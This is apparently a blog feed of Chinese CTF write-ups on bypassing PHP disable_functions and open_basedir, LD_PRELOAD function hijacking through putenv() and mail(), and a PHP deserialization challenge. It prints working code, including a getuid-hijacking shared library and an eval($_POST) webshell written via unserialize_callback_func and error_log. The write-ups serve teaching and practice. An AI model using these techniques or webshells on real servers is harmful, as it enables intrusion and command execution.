<span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
<span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505211624222.png" alt="image-20210505211624222"></p>
<h2 id="工具流谬杀">工具流谬杀</h2>
<p>本来以为这就结束了，看大佬博客的时候居然看到一位师傅改蚁剑脚本就能解题，我?????，复现一下。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505213712742.png" alt="image-20210505213712742"></p>
<p>蚁剑的自带工具就有关于FCGI的disable_function绕过，但要求<strong>fsockopen</strong>函数没有被过滤，并且默认端口为9000，所以当然直接用是绕过不了的。</p>
<p>但是php中还有一个<strong>pfsockopen</strong>函数，两者的区别仅仅只是发包<strong>Keep-Alive</strong>上的区别，对问题毫无影响！那我们直接深入到payload源码中去。</p>
<ul>
<li>\antData\plugins\as_bypass_php_disable_functions-master\payload.js</li>
<li>\antData\plugins\as_bypass_php_disable_functions-master\core\php_fpm\index.js</li>
</ul>
<p>把9000端口改为9001,<strong>fsockopen</strong>改为<strong>pfsockopen</strong>,然后传一个普通的一句话在html/下，用这个php去连接。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505214756517.png" alt="image-20210505214756517"></p>
<p>会在<strong>html/<strong>生成一个</strong>.antproxy.php</strong>文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505220251625.png" alt="image-20210505220251625"></p>
<p>再用这个文件做马连接蚁剑，发现已经成为root用户..用php权限可直接查看flag。。。太骚了，妥妥的非预期。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505220421304.png" alt="image-20210505220421304"></p>
<h2 id="后话">后话</h2>
<p>这一题还是挺牛逼的，结合的知识点相当多，无论是恶意加载链接库，fastcgi未授权访问，还是ftp打ssrf都可以写一篇文章，慢慢学吧~</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://github.com/wofeiwo/webcgi-exploits">webcgi-exploits</a></li>
<li><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html">PHP绕过open_basedir列目录的研究</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></li>
<li><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">phith0n-fpm.py</a></li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>利用LD_PRELOAD绕过disable_function</title>
			<link>https://theoyu.top/posts/disabled_function/</link>
			<pubDate>Mon, 03 May 2021 10:24:32 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/disabled_function/</guid>
			<description>什么是LD_PRELOAD 在Linux的动态链接库的世界中，LD_PRELOAD是一个环境变量，它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。
这里我们举行一个密码验证的例子，来初步探究LD_PRELOAD与动态链接的关系。
/* login.c */ #include &amp;lt;stdio.h&amp;gt;#include&amp;lt;string.h&amp;gt;int main(int argc,char **argv){ char passwd[]=&amp;#34;password&amp;#34;; if(!strcmp(passwd,argv[1])){ printf(&amp;#34;Correct Password!/n&amp;#34;); return 1; } printf(&amp;#34;Invalid Password!/n&amp;#34;); return 0; } 在上面这段程序中，我们使用了strcmp函数来判断两个字符串是否相等。下面，我们使用一个动态函数库来重载strcmp函数：
/* hack.c */ #include &amp;#34;stdio.h&amp;#34;#include &amp;lt;string.h&amp;gt;int strcmp(const char *s1,const char *s2){ printf(&amp;#34;hacking! s1=%s,s2=%s\n&amp;#34;,s1,s2); // return 0 indicates that 2 strings are equial  return 0 ; } 编译程序：
☁ c gcc login.c -o login ☁ c gcc -shared hack.c -o hack.so 运行一下:
☁ c .</description>
			<content type="html"><![CDATA[<h2 id="什么是ld_preload">什么是LD_PRELOAD</h2>
<p>在<strong>Linux</strong>的动态链接库的世界中，<strong>LD_PRELOAD</strong>是一个环境变量，它可以影响程序的运行时的链接（Runtime linker），允许你定义在程序运行前优先加载的动态链接库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p>
<p>这里我们举行一个密码验证的例子，来初步探究<strong>LD_PRELOAD</strong>与动态链接的关系。</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* login.c */</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span><span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
    <span class="kt">char</span> <span class="n">passwd</span><span class="p">[]</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">passwd</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])){</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Correct Password!/n&#34;</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Invalid Password!/n&#34;</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>在上面这段程序中，我们使用了strcmp函数来判断两个字符串是否相等。下面，我们使用一个动态函数库来重载strcmp函数：</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* hack.c */</span>
<span class="cp">#include</span> <span class="cpf">&#34;stdio.h&#34;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span><span class="kt">int</span> <span class="nf">strcmp</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s1</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">s2</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;hacking! s1=%s,s2=%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">s1</span><span class="p">,</span><span class="n">s2</span><span class="p">);</span>
    <span class="c1">// return 0 indicates that 2 strings are equial 
</span><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span> <span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>编译程序：</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">☁  c  gcc login.c -o login
☁  c  gcc -shared hack.c -o hack.so
</code></pre></div><p>运行一下:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">☁  c  ./login <span class="m">123456</span>
Invalid Password!/n% 
</code></pre></div><p>设置<strong>LD_PRELOAD</strong>变量:(使我们重写过的strcmp函数的hack.so成为优先载入链接库)，再重新运行</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">☁  c  <span class="nb">export</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="s2">&#34;./hack.so&#34;</span>
☁  c  ./login <span class="m">123456</span>
hacking! <span class="nv">s1</span><span class="o">=</span>password,s2<span class="o">=</span><span class="m">123456</span>
Correct Password!/n%
</code></pre></div><p>可以看到：</p>
<ol>
<li>我们的hack.so中的ctramp被调用了。</li>
<li>主程序中的运行结果被影响了。</li>
</ol>
<h2 id="绕过disable_function">绕过disable_function</h2>
<p>设想这样一种思路:</p>
<pre><code>利用web漏洞启动一个新进程a.bin
a.bin内部调用系统函数b(),b()位于系统共享对象c.so中
我们创建c_evil.so，c_evil.so含有与b()中同名的恶意函数，同时把利用web漏洞将c_evil.so加载到环境变量中
由于c_evil.so优先级最高，所以a.bin将调用c_evil.so中的b()，达到命令执行。
</code></pre>
<p>根据上面的思路，我们需要web漏洞环境满足以下几种条件：</p>
<ol>
<li>具有可写入目录,用于上传.so文件</li>
<li>能够控制<strong>LD_PRELOAD</strong>环境变量的值，例如<strong>putenv()</strong> 函数。</li>
<li>函数调用的新进程需要加载.so文件。</li>
</ol>
<p>在第三点中，经过测试<code>mail()</code>、<code>imap_mail()</code>、<code>mb_send_mail()</code>、<code>error_log()</code>均可以调用外部新进程，这里我们拿<code>mail()</code>作为研究对象。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><strong>strace</strong>命令可以用于跟踪api调用情况</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">☁  ~  strace -f php mail.php 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -A2 -B2 execve
sh: 1: /usr/sbin/sendmail: not found
</code></pre></div><p>发现确实调用了外部进程..但我没有下载&hellip;下载后:</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-03-image-20210503141852067.png" alt="image-20210503141852067"></p>
<p>我们再跟进看一看<strong>sendmail</strong>：</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">☁  ~  readelf -Ws /usr/sbin/sendmail
Symbol table <span class="s1">&#39;.dynsym&#39;</span> contains <span class="m">347</span> entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: <span class="m">0000000000000000</span>     <span class="m">0</span> NOTYPE  LOCAL  DEFAULT  UND 
     1: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND sasl_server_init@SASL2 <span class="o">(</span>2<span class="o">)</span>
     2: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND DH_size@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
     3: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND X509_STORE_set_flags@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
     4: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND wait@GLIBC_2.2.5 <span class="o">(</span>4<span class="o">)</span>
     5: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND X509_STORE_add_crl@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
     6: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND SSL_CTX_load_verify_locations@OPENSSL_1_1_0 <span class="o">(</span>5<span class="o">)</span>
     7: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND SSL_CTX_set_client_CA_list@OPENSSL_1_1_0 <span class="o">(</span>5<span class="o">)</span>
     8: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND ERR_reason_error_string@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
     9: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND DSA_generate_parameters_ex@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
    10: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND getuid@GLIBC_2.2.5 <span class="o">(</span>4<span class="o">)</span>
    11: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND getsockname@GLIBC_2.2.5 <span class="o">(</span>4<span class="o">)</span>
    12: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND __res_state@GLIBC_2.2.5 <span class="o">(</span>4<span class="o">)</span>
    13: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND uname@GLIBC_2.2.5 <span class="o">(</span>4<span class="o">)</span>
    14: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND BN_new@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
    15: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND <span class="k">select</span>@GLIBC_2.2.5 <span class="o">(</span>4<span class="o">)</span>
    16: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND RSA_new@OPENSSL_1_1_0 <span class="o">(</span>3<span class="o">)</span>
    17: <span class="m">0000000000000000</span>     <span class="m">0</span> FUNC    GLOBAL DEFAULT  UND memcpy@GLIBC_2.14 <span class="o">(</span>6<span class="o">)</span>
    ...
	...
</code></pre></div><p>在若干库函数中，我们选择<strong>getuid</strong>作为研究对象。</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* hack.c*/</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
</span><span class="cp"></span>
<span class="kt">void</span> <span class="nf">hack</span><span class="p">(){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&#34;echo theoyu &gt; result&#34;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">getuid</span><span class="p">(){</span>
    <span class="n">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
    <span class="n">hack</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div><p>编译:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">☁  demo  gcc -shared hack.c -o hack.so
</code></pre></div><p>php：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">putenv</span><span class="p">(</span><span class="s2">&#34;LD_PRELOAD=/home/theoyu/demo/hack.so&#34;</span><span class="p">);</span>
<span class="nx">mail</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>执行:</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">☁  demo  php mail.php
☁  demo  cat result 
theoyu
</code></pre></div><p>可以看到我们没有利用任何PHP 的 命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。</p>
<p>但很明显可以看到一点，在真实情况下，肉鸡不一定安装了<strong>sendmail</strong>，我们也不可能通过www-data用户去让其安装，基于这点，<a href="https://www.freebuf.com/web/192052.html">yangyangwithgnu</a>师傅发现了一个可以<strong>加载时就执行代码</strong>的方法，进而达到命令执行的效果。</p>
<h2 id="一个误区">一个误区</h2>
<p>在<a href="https://github.com/yangyangwithgnu">yangyangwithgnu</a>的文章中，是这样写到的：</p>
<pre><code>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，
而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数
简直神似！几经搜索后了解，GCC 有个 C 语言扩展修饰符 __attribute__((constructor))，
可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加
载，立即将执行 __attribute__((constructor)) 修饰的函数。强调下，这一细节非常重要，很多
朋友用LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，我们不
要局限于仅劫持某一函数，而应考虑劫持共享对象。
</code></pre>
<p>按照这篇文章的说法，我们只需利用<code>putenv</code>设置<code>LD_PRELOAD</code> ，使得使用了<code>__attribute__((constructor))</code>修饰函数的恶意动态链接库被系统加载便能实现命令执行，而不再需要再去劫持程序调用的库函数，<code>sendmail</code> 存不存在也就无所谓了。</p>
<p>然而我们的这个恶意动态链接库（共享对象）究竟是怎么被 “系统” 加载的呢？文章中没有说的很清楚，也可能是我对于程序的链接、装载这一块确实不了解，所以我打算动手实践一下。</p>
<p>但是一个不可思议的结果发生了&hellip; 我手动把<strong>sendmail</strong> 删除后，不小心又重新运行了一次<code>php mail.php</code>,<strong>result</strong> 命令执行居然还是成功了。</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">☁  demo  php mail.php 
sh: 1: /usr/sbin/sendmail: not found
☁  demo  cat result 
theoyu
</code></pre></div><p>这我不太能接受，如果sendmail根本不需要的话，那文章的后大篇幅关于**__attribute__((constructor))**的讲解也是没有太大意义的，我们回头看看<code>strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-03-image-20210503160144193.png" alt="image-20210503160144193"></p>
<p>事实上，顺着作者的思路，我们居然把**/bin/sh**这个调用进程所忽略了，也就是说在这一步，真正加载了动态链接库的其实是<code>/bin/sh</code> 的进程，其实我们大可不必使用<code>__attribute__((constructor))</code> ，直接劫持<code>/bin/sh</code> 的库函数即可,方法与**sendmail** 一致。可以说用<code>__attribute__((constructor))</code> ，只是为我们免去了挑选库函数的一步而已。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.anquanke.com/post/id/175403#h2-1">深入浅出LD_PRELOAD &amp; putenv()</a></li>
<li><a href="https://www.freebuf.com/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions</a></li>
</ul>
]]></content>
		</item>
		
		<item>
			<title>某群一道反序列化题</title>
			<link>https://theoyu.top/posts/unserialize1/</link>
			<pubDate>Sun, 02 May 2021 16:24:32 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/unserialize1/</guid>
			<description>五一忽然就要过了..感觉要学的好没学，考试也没复习，早上12点在某ctf群看到在讨论这道题，就起床做做了&amp;hellip;
 题目给出源码：
&amp;lt;?php highlight_file(__FILE__); class main{ public $settings; public $params; public function __construct(){ $this-&amp;gt;settings=array( &amp;#39;display_errors&amp;#39;=&amp;gt;&amp;#39;On&amp;#39;, &amp;#39;allow_url_fopen&amp;#39;=&amp;gt;&amp;#39;On&amp;#39; ); $this-&amp;gt;params=array(); } public function __wakeup(){ foreach ($this-&amp;gt;settings as $key =&amp;gt; $value) { ini_set($key, $value); } } public function __destruct(){ file_put_contents(&amp;#39;settings.inc&amp;#39;, unserialize($this-&amp;gt;params)); } } unserialize($_GET[&amp;#39;data&amp;#39;]); 法一 反序列化回调函数+后缀文件包含 给了源码就好说，在本地测试一下。我们可以对settings.inc文件进行写入，那自然想到的就是写入一句话然后进行文件包含，找一下有没有原生调用函数的方法。
就在官网手册的unserialize() 处发现了这个函数，官方给出的实例是这样的
&amp;lt;?php $serialized_object=&amp;#39;O:1:&amp;#34;a&amp;#34;:1:{s:5:&amp;#34;value&amp;#34;;s:3:&amp;#34;100&amp;#34;;}&amp;#39;; // unserialize_callback_func 从 PHP 4.2.0 起可用 ini_set(&amp;#39;unserialize_callback_func&amp;#39;, &amp;#39;mycallback&amp;#39;); // 设置您的回调函数  function mycallback($classname) { // 只需包含含有类定义的文件  // $classname 指出需要的是哪一个类 } ?</description>
			<content type="html"><![CDATA[<blockquote>
<p>五一忽然就要过了..感觉要学的好没学，考试也没复习，早上12点在某ctf群看到在讨论这道题，就起床做做了&hellip;</p>
</blockquote>
<p>题目给出源码：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="k">class</span> <span class="nc">main</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$settings</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">settings</span><span class="o">=</span><span class="k">array</span><span class="p">(</span>
        <span class="s1">&#39;display_errors&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;On&#39;</span><span class="p">,</span>
        <span class="s1">&#39;allow_url_fopen&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;On&#39;</span>
        <span class="p">);</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="o">=</span><span class="k">array</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">settings</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">ini_set</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
        <span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;settings.inc&#39;</span><span class="p">,</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span> 
</code></pre></div><h2 id="法一-反序列化回调函数后缀文件包含">法一 反序列化回调函数+后缀文件包含</h2>
<p>给了源码就好说，在本地测试一下。我们可以对<code>settings.inc</code>文件进行写入，那自然想到的就是写入一句话然后进行文件包含，找一下有没有原生调用函数的方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-04-image-20210504171255837.png" alt="image-20210504171255837"></p>
<p>就在官网手册的<strong>unserialize()</strong> 处发现了这个函数，官方给出的实例是这样的</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$serialized_object</span><span class="o">=</span><span class="s1">&#39;O:1:&#34;a&#34;:1:{s:5:&#34;value&#34;;s:3:&#34;100&#34;;}&#39;</span><span class="p">;</span>

<span class="c1">// unserialize_callback_func 从 PHP 4.2.0 起可用
</span><span class="c1"></span><span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;unserialize_callback_func&#39;</span><span class="p">,</span> <span class="s1">&#39;mycallback&#39;</span><span class="p">);</span> <span class="c1">// 设置您的回调函数
</span><span class="c1"></span>
<span class="k">function</span> <span class="nf">mycallback</span><span class="p">(</span><span class="nv">$classname</span><span class="p">)</span> 
<span class="p">{</span>
   <span class="c1">// 只需包含含有类定义的文件
</span><span class="c1"></span>   <span class="c1">// $classname 指出需要的是哪一个类
</span><span class="c1"></span><span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>看到这个<code>ini_set()</code>&hellip;居然和题目的<code>__wakeup()</code>一模一样，那百分之百没得跑了。具体来说只要反序列化实例不存在的类，调用<code>unserialize_callback_func</code>就会把类名作为参数传递给回调函数。那么我们的回调函数设置为什么呢？第一个想到的是<code>include</code>，但这有一个问题。</p>
<p>如果要包含<code>settings.inc</code>，就得实例化这个类，但php类名是不能存在<code>.</code>这个字符的，over，翻手册，找到了
一个<code>spl_autoload</code>函数。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-04-image-20210504235914738.png" alt="image-20210504235914738"></p>
<p>这个函数支持使用<code>spl_autoload_extensions</code>拓展文件名</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">spl_autoload_extensions</span><span class="p">(</span><span class="s2">&#34;.php,.inc&#34;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>如果没有，则默认这两个都拓展。拿一个小demo测试一下。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;unserialize_callback_func&#34;</span><span class="p">,</span><span class="s2">&#34;spl_autoload&#34;</span><span class="p">);</span>
<span class="k">class</span> <span class="nc">main</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="k">new</span> <span class="nx">settings</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// $demo=new main;
</span><span class="c1"></span><span class="nv">$string</span><span class="o">=</span><span class="s1">&#39;O:4:&#34;main&#34;:1:{s:1:&#34;a&#34;;O:8:&#34;settings&#34;:0:{}}&#39;</span><span class="p">;</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$string</span><span class="p">));</span>
</code></pre></div><p>在<code>settings.inc</code>中写入<code>&lt;?php echo &quot;hello world&quot;?&gt;</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505001830321.png" alt="image-20210505001830321"></p>
<p>在实例化<strong>settings</strong>这个类时调用了回调函数，执行<code>spl_autoload('settings')</code>，成功进行文件包含，那原题思路就很清晰了。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">settings</span><span class="p">{}</span>
<span class="k">class</span> <span class="nc">main</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$settings</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;unserialize_callback_func&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;spl_autoload&#34;</span><span class="p">);</span>
    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="o">=</span><span class="nx">serialize</span><span class="p">(</span><span class="s1">&#39;&lt;?php @eval($_POST[theoyu]) ?&gt;&#39;</span><span class="p">);</span>  
        <span class="cm">/* $this-&gt;params=serialize(new settings);*/</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$demo</span> <span class="o">=</span><span class="k">new</span> <span class="nx">main</span><span class="p">;</span>
<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$demo</span><span class="p">);</span>
</code></pre></div><p>先写入一句话木马，再执行注释部分文件包含即可。</p>
<h2 id="法二-利用错误信息写入一句胡">法二 利用错误信息写入一句胡</h2>
<p>在群里看到有人说好像利用<code>err_log()</code>方法可以将报错的信息写入指定的文件，有点像phpmyadmin日志写马那种，我也尝试了一下。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;error_log&#34;</span><span class="p">,</span><span class="s2">&#34;err.php&#34;</span><span class="p">);</span>
<span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;unserialize_callback_func&#34;</span><span class="p">,</span><span class="s1">&#39;&lt;?php eval($_POST[theoyu]); ?&gt;&#39;</span><span class="p">);</span>
<span class="k">class</span> <span class="nc">main</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="k">new</span> <span class="nx">settings</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// $demo=new main;
